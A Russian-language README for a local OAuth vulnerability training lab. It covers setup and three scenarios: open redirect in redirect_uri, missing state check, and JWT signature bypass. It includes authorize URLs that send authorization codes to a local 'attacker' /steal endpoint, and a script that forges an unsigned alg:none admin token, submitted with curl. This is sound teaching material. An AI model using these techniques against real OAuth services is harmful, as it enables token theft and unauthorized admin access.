# OAuth Vulnerability Lab

Стенд для демонстрации известных уязвимостей протокола OAuth 2.0.

## Требования к среде

- VirtualBox 6.1 или новее
- Vagrant 2.3 или новее
- Git (опционально, для клонирования репозитория)
- Минимум 4 ГБ оперативной памяти для виртуальной машины
- 10 ГБ свободного места на диске

## Архитектура

Стенд разворачивается внутри виртуальной машины Ubuntu 22.04, управляемой через Vagrant. Внутри виртуальной машины работает Docker Compose, который поднимает сервисы каждого сценария. Провижининг выполняется с помощью Ansible: устанавливаются Docker, Docker Compose, Python и библиотеки для тестирования.

Структура проекта:

    oauth-vuln-lab/
    ├── Vagrantfile
    ├── Makefile
    ├── build.sh
    ├── build.ps1
    ├── README.md
    ├── provisioning/
    │   └── playbook.yml
    ├── scenarios/
    │   ├── open-redirect/
    │   ├── csrf-state/
    │   └── jwt-bypass/
    └── tests/
        └── test_open_redirect.py

## Пошаговая установка и запуск

### Шаг 1. Клонирование проекта

    git clone https://github.com/Teodor31756/oauth-vuln-lab
    cd oauth-vuln-lab

Или распакуйте ZIP-архив.

### Шаг 2. Запуск виртуальной машины

    vagrant up

Первый запуск занимает 10–20 минут: скачивается образ Ubuntu, устанавливается Docker, выполняется провижининг.

### Шаг 3. Вход в виртуальную машину

    vagrant ssh

### Шаг 4. Запуск сценария

Внутри виртуальной машины:

    cd /vagrant
    docker-compose -f scenarios/open-redirect/docker-compose.yml up -d

Аналогично для других сценариев:

    docker-compose -f scenarios/csrf-state/docker-compose.yml up -d
    docker-compose -f scenarios/jwt-bypass/docker-compose.yml up -d

### Шаг 5. Остановка

    docker-compose -f scenarios/open-redirect/docker-compose.yml down

Полное удаление виртуальной машины:

    vagrant destroy -f

## Сценарии и примеры использования

### Сценарий 1. Открытое перенаправление в redirect_uri

Уязвимость: сервер авторизации не проверяет redirect_uri по белому списку.

Запуск:

    docker-compose -f scenarios/open-redirect/docker-compose.yml up -d

Демонстрация — откройте в браузере:

    http://localhost:8080/authorize?client_id=test-client&redirect_uri=http://localhost:8082/steal&response_type=code&state=test

Ожидаемый результат: браузер перенаправлен на сервер атакующего (http://localhost:8082/steal), страница показывает `stolen: <код>`.

Входные данные: GET-параметры client_id, redirect_uri, response_type, state.
Выходные данные: HTTP 302 на redirect_uri с кодом в параметре code.

### Сценарий 2. CSRF через параметр state

Уязвимость: сервер не проверяет state при обмене кода на токен.

Запуск:

    docker-compose -f scenarios/csrf-state/docker-compose.yml up -d

Демонстрация:

    http://localhost:8083/authorize?client_id=test-client&redirect_uri=http://localhost:8085/steal&response_type=code&state=fixed

Ожидаемый результат: код перехвачен сервером атакующего.

Входные данные: GET-параметры с фиксированным state.
Выходные данные: HTTP 302 на redirect_uri с кодом.

### Сценарий 3. Обход проверки подписи JWT

Уязвимость: сервер декодирует JWT с verify_signature=False.

Запуск:

    docker-compose -f scenarios/jwt-bypass/docker-compose.yml up -d

Генерация поддельного токена:

    python3 -c "
    import base64, json
    header = {'alg': 'none', 'typ': 'JWT'}
    payload = {'sub': 'admin', 'role': 'admin'}
    b64 = lambda d: base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
    print(f'{b64(header)}.{b64(payload)}.')
    "

Отправка токена:

    curl -X POST http://localhost:8086/admin -H "Content-Type: application/json" -d "{\"token\": \"<TOKEN>\"}"

Ожидаемый результат:

    {"role":"admin","user":"admin","welcome":"admin panel"}

Входные данные: JSON {"token": "<jwt>"}.
Выходные данные: JSON с полями valid, claims или welcome, user, role.

## Тестирование

Используется библиотека pytest.

Запуск всех тестов:

    cd /vagrant
    docker-compose -f scenarios/open-redirect/docker-compose.yml up -d
    pytest tests/ -v
    docker-compose -f scenarios/open-redirect/docker-compose.yml down

Ожидаемый результат: оба теста PASSED.

## Контейнеризация

Каждый сервис упакован в Docker-образ на базе python:3.10-slim. Сборка описана в Dockerfile внутри соответствующей папки сервиса. Запуск осуществляется через docker-compose.

Просмотр запущенных контейнеров:

    docker ps

Просмотр логов:

    docker logs <container-name>

## Файлы сборки

- Makefile — цели up, up-open, down-open, test, clean
- build.sh — сборка всех сценариев внутри виртуальной машины
- build.ps1 — запуск виртуальной машины и сборка из Windows